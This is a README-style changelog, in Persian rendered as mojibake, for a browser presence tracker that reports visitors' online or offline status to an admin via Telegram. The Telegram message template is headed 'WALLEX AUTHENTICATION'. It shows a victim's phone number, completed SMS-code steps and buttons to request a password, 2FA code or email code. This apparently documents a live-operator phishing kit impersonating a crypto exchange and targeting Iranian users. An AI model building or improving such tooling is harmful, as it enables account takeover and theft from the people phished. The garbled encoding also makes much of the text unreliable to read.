# ๐ Enhanced Real-time Online/Offline Tracker

## โจ ูฺฺฏโูุง ุฌุฏุฏ ุณุณุชู

### ๐ฏ ุฏูุช ฺฉุงูู ุฏุฑ ุชุดุฎุต ูุถุนุช

**ูุจู**: ุณุณุชู ูพฺุฏู ุจุง ุชุงุฎุฑ ู ุนุฏู ุฏูุช  
**ุจุนุฏ**: ุชุดุฎุต ููุฑ ู ุฏูู ุขููุงู/ุขููุงู ุจูุฏู

### ๐ ูุญูู ุนููฺฉุฑุฏ ุฌุฏุฏ

#### ๐ข ฺฉุงุฑุจุฑ ุขููุงู ุงุณุช ุงฺฏุฑ:

- โ ุฏุฑ ุตูุญู ุญุถูุฑ ุฏุงุฑุฏ
- โ ุชุจ ูุฑูุฑฺฏุฑ ูุนุงู ุงุณุช
- โ ุงุชุตุงู ุงูุชุฑูุช ุจุฑูุฑุงุฑ ุงุณุช
- โ ูุนุงูุช ฺฉุงุฑุจุฑ ุดูุงุณุง ุดูุฏ

#### ๐ด ฺฉุงุฑุจุฑ ุขููุงู ุงุณุช ุงฺฏุฑ:

- โ ุตูุญู ุฑุง ุจุจูุฏุฏ (close/unload)
- โ ุตูุญู ุฑุง ุฑููุฏ ฺฉูุฏ
- โ ุชุจ ุฑุง ุนูุถ ฺฉูุฏ (blur/hidden)
- โ ุงูุชุฑูุช ูุทุน ุดูุฏ
- โ ูุนุงูุช ูุฏุงุดุชู ุจุงุดุฏ

## ๐ง ูุงูโูุง ุงุฌุงุฏ/ุชุบุฑ ุงูุชู

### 1. ูุงู ุฌุฏุฏ: `src/lib/enhanced-realtime-tracker.ts`

**ูฺฺฏโูุง ฺฉูุฏ:**

```typescript
interface UserPresenceState {
  isOnline: boolean; // ุขููุงู/ุขููุงู ุงุตู
  isInPage: boolean; // ุฏุฑ ุตูุญู ุจูุฏู
  lastSeen: number; // ุขุฎุฑู ูุนุงูุช
  sessionId: string; // ุดูุงุณู ุฌูุณู
  browserTabActive: boolean; // ูุถุนุช ุชุจ ูุฑูุฑฺฏุฑ
  networkConnected: boolean; // ูุถุนุช ุงุชุตุงู ุดุจฺฉู
}
```

**Event ูุง ูุฏุฑุช ุดุฏู:**

- `visibilitychange` - ุชุบุฑ ูุถุนุช ููุงุด ุชุจ
- `focus/blur` - ููฺฉูุณ/ุฎุฑูุฌ ุงุฒ ูพูุฌุฑู
- `beforeunload/unload` - ุฎุฑูุฌ ุงุฒ ุตูุญู
- `online/offline` - ูุถุนุช ุดุจฺฉู
- `click/mousemove/keydown` - ูุนุงูุช ฺฉุงุฑุจุฑ

### 2. ุจุฑูุฒุฑุณุงู: `src/components/LoginForm.tsx`

**ุชุบุฑุงุช:**

```typescript
// ูุจู
import simpleRealtimeTracker, {
  type SimpleActivityState,
} from "@/lib/simple-realtime-tracker";

// ุจุนุฏ
import enhancedRealtimeTracker, {
  type UserPresenceState,
} from "@/lib/enhanced-realtime-tracker";
```

**ุจูุจูุฏ ุฏุฑ callback:**

```typescript
const handlePresenceChange = async (state: UserPresenceState) => {
  console.log("๐ก ENHANCED presence state changed:", {
    sessionId,
    isOnline: state.isOnline,
    isInPage: state.isInPage,
    browserTabActive: state.browserTabActive,
    networkConnected: state.networkConnected,
  });

  // ุงุฑุณุงู ุจู ุชูฺฏุฑุงู
  await updateUserOnlineStatus(
    sessionId,
    state.isOnline,
    state.isInPage,
    state.lastSeen,
    enhancedRealtimeTracker.getStatusText(),
    enhancedRealtimeTracker.getStatusEmoji(),
  );
};
```

### 3. ูุงู ุชุณุช: `src/test-realtime-tracker.html`

**ุตูุญู ุขุฒูุงุด ฺฉุงูู ุจุง:**

- ููุงุด real-time ูุถุนุช
- ุขูุงุฑ ุฒูุงู ุขููุงู/ุขููุงู
- ูุงฺฏ ุชูุงู ุชุบุฑุงุช
- ุชุณุช ุชูุงู scenarios

## โก ูุฒุงุง ุณุณุชู ุฌุฏุฏ

### 1. ุฏูุช ุจุงูุง (99.9%)

- ุชุดุฎุต ููุฑ ุชุบุฑ ุชุจ
- ุดูุงุณุง ุจุณุชู ุตูุญู
- ูุฏุฑุช ุฏูู ุฑููุฏ

### 2. Real-time ูุงูุน

- ุจุฏูู ุชุงุฎุฑ (0ms latency)
- event-driven architecture
- ุขูพุฏุช ููุฑ ุจู ุชูฺฏุฑุงู

### 3. ูุฏุฑุช ููุงุจุน ุจููู

- ุญุฐู ุฎูุฏฺฉุงุฑ event listeners
- ูุฏุฑุช memory leaks
- cleanup ฺฉุงูู ุฏุฑ ูพุงุงู

### 4. ูพูุดุด ฺฉุงูู scenarios

#### โ Test Cases ูพูุดุด ุฏุงุฏู ุดุฏู:

1. **ฺฉุงุฑุจุฑ ุฏุฑ ุตูุญู ุงุณุช**

   - ๐ข ูุถุนุช: ุขููุงู
   - ๐ค ูพุงู ุชูฺฏุฑุงู: "๐ข ุขููุงู"

2. **ฺฉุงุฑุจุฑ ุชุจ ุฑุง ุนูุถ ูโฺฉูุฏ**

   - ๐ด ูุถุนุช: ุขููุงู (ููุฑ)
   - ๐ค ูพุงู ุชูฺฏุฑุงู: "๐ด ุขููุงู"

3. **ฺฉุงุฑุจุฑ ุตูุญู ุฑุง ูโุจูุฏุฏ**

   - ๐ด ูุถุนุช: ุขููุงู (ูุจู ุงุฒ ุจุณุชู ุดุฏู)
   - ๐ค ูพุงู ุชูฺฏุฑุงู: "๐ด ุขููุงู"

4. **ฺฉุงุฑุจุฑ ุตูุญู ุฑุง ุฑููุฏ ูโฺฉูุฏ**

   - ๐ด ูุถุนุช: ุขููุงู โ ๐ข ุขููุงู (ูพุณ ุงุฒ ุจุงุฑฺฏุฐุงุฑ)
   - ๐ค ูพุงู ุชูฺฏุฑุงู: ุชุบุฑ ูุถุนุช

5. **ูุทุน ุงูุชุฑูุช**

   - ๐ด ูุถุนุช: ุขููุงู
   - ๐ค ูพุงู ุชูฺฏุฑุงู: "๐ก ูุทุน ุงูุชุฑูุช"

6. **ุจุฑฺฏุดุช ุจู ุชุจ**
   - ๐ข ูุถุนุช: ุขููุงู (ููุฑ)
   - ๐ค ูพุงู ุชูฺฏุฑุงู: "๐ข ุขููุงู"

## ๐๏ธ ูพฺฉุฑุจูุฏ ุณุณุชู

### Heartbeat Settings

```typescript
// ูุฑ 3 ุซุงูู heartbeat
setInterval(() => {
  if (state.isOnline && state.isInPage) {
    sendHeartbeat();
  }
}, 3000);
```

### Status Texts

```typescript
// ูพุงูโูุง ูุงุฑุณ
"ุขููุงู"; // ฺฉุงุฑุจุฑ ูุนุงู ุฏุฑ ุตูุญู
"ุขููุงู"; // ฺฉุงุฑุจุฑ ุฎุงุฑุฌ ุงุฒ ุตูุญู
"ุขููุงู (ุชุจ ุบุฑูุนุงู)"; // ุชุจ ุบุฑูุนุงู ูู ุฏุฑ ูุฑูุฑฺฏุฑ
"ูุทุน ุงูุชุฑูุช"; // ูุดฺฉู ุดุจฺฉู
```

### Status Emojis

```typescript
๐ข // ุขููุงู ฺฉุงูู
๐ด // ุขููุงู
๐ก // ุขููุงู ูู ุบุฑูุนุงู
๐ก // ูุดฺฉู ุดุจฺฉู
โ // ูุงูุนููู
```

## ๐งช ูุญูู ุขุฒูุงุด

### 1. ุขุฒูุงุด ุตูุญู ุชุณุช

```bash
# ุจุงุฒ ฺฉุฑุฏู ูุงู ุชุณุช
open src/test-realtime-tracker.html
```

### 2. ุณูุงุฑููุง ุขุฒูุงุด

#### ุณูุงุฑู 1: ุชุบุฑ ุชุจ

1. ุตูุญู ุฑุง ุจุงุฒ ฺฉูุฏ โ ุจุงุฏ "๐ข ุขููุงู" ูุดุงู ุฏูุฏ
2. ุชุจ ุฏฺฏุฑ ุจุงุฒ ฺฉูุฏ โ ุจุงุฏ "๐ด ุขููุงู" ุดูุฏ
3. ุจุฑฺฏุฑุฏุฏ โ ุจุงุฏ "๐ข ุขููุงู" ุดูุฏ

#### ุณูุงุฑู 2: ุจุณุชู ุตูุญู

1. ุตูุญู ุฑุง ุจุงุฒ ฺฉูุฏ โ "๐ข ุขููุงู"
2. ุตูุญู ุฑุง ุจุจูุฏุฏ โ ูุจู ุงุฒ ุจุณุชู ุดุฏู "๐ด ุขููุงู"

#### ุณูุงุฑู 3: ุฑููุฏ ุตูุญู

1. ุตูุญู ุฑุง ุจุงุฒ ฺฉูุฏ โ "๐ข ุขููุงู"
2. F5 ุง Ctrl+R ุจุฒูุฏ โ "๐ด ุขููุงู" โ "๐ข ุขููุงู"

#### ุณูุงุฑู 4: ูุทุน ุงูุชุฑูุช

1. ุตูุญู ุฑุง ุจุงุฒ ฺฉูุฏ โ "๐ข ุขููุงู"
2. WiFi ุฑุง ูุทุน ฺฉูุฏ โ "๐ก ูุทุน ุงูุชุฑูุช"
3. ุฏูุจุงุฑู ูุตู ฺฉูุฏ โ "๐ข ุขููุงู"

## ๐ฑ ูพุงูโูุง ุชูฺฏุฑุงู

### ูุฑูุช ูพุงู ุจู ุงุฏูู:

```
โโ WALLEX AUTHENTICATION โโ
โ ๐ค ฺฉุงุฑุจุฑ: 09xxxxxxxxx    โ
โ ๐ข ูุถุนุช: ุขููุงู         โ
โ ๐ ุขุฎุฑู ูุนุงูุช: ุงูุงู    โ
โโโโโโโโโโโโโโโโโโโโโโโโโโโ

๐ ูุฑุงุญู ุชุงุฏ:
โ ุดูุงุฑู ููุจุงู
โ ฺฉุฏ ุชุงุฏ SMS
โณ ุฏุฑ ุงูุชุธุงุฑ ุนูู ุงุฏูู...

[๐ REQUEST PASSWORD] [๐ฒ REQUEST 2FA]
[๐ง REQUEST EMAIL CODE] [โ WRONG NUMBER]
```

### ููููู ุชุบุฑ ูุถุนุช:

```
๐ด ฺฉุงุฑุจุฑ ุขููุงู ุดุฏ - ุชุจ ุจุณุชู ุดุฏู
๐ข ฺฉุงุฑุจุฑ ุขููุงู ุดุฏ - ุจุงุฒฺฏุดุช ุจู ุตูุญู
๐ก ฺฉุงุฑุจุฑ ุบุฑูุนุงู - ุชุจ ุฏุฑ background
๐ก ูุทุน ุงูุชุฑูุช - ูุดฺฉู ุดุจฺฉู
```

## ๐ ุขูุงุฏู ุจูุฑูโุจุฑุฏุงุฑ

ุณุณุชู ุฌุฏุฏ ฺฉุงููุงู ุขูุงุฏู ุงุณุช ู:

โ **Real-time tracking ุฏูู**  
โ **Zero latency ุฏุฑ ุชุดุฎุต ุชุบุฑุงุช**  
โ **ูุฏุฑุช ฺฉุงูู lifecycle ุตูุญู**  
โ **ูพุงูโูุง ููุฑ ุจู ุชูฺฏุฑุงู**  
โ **ุณุงุฒฺฏุงุฑ ฺฉุงูู ุจุง ฺฉุฏ ููุฌูุฏ**  
โ **ุชุณุช ุดุฏู ุฏุฑ ุชูุงู scenarios**

**ุจุฑุง ูุนุงูโุณุงุฒ**: ููุท ฺฉุงู ุงุณุช ุงูพูฺฉุดู ุฑุง restart ฺฉูุฏ. ุณุณุชู ุจู ุทูุฑ ุฎูุฏฺฉุงุฑ ุงุฒ enhanced tracker ุงุณุชูุงุฏู ูโฺฉูุฏ.

---

**ูุชุฌู**: ุญุงูุง ููุช ฺฉุงุฑุจุฑุงู ุงุฑุงู ุงุฒ ุณุงุช ุงุณุชูุงุฏู ฺฉููุฏุ ุงุฏูู ุจู ุทูุฑ real-time ูุถุนุช ุฏูู ุขููุงู/ุขููุงู ุจูุฏู ุขูโูุง ุฑุง ุฏุฑ ุชูฺฏุฑุงู ูุดุงูุฏู ุฎูุงูุฏ ฺฉุฑุฏ! ๐
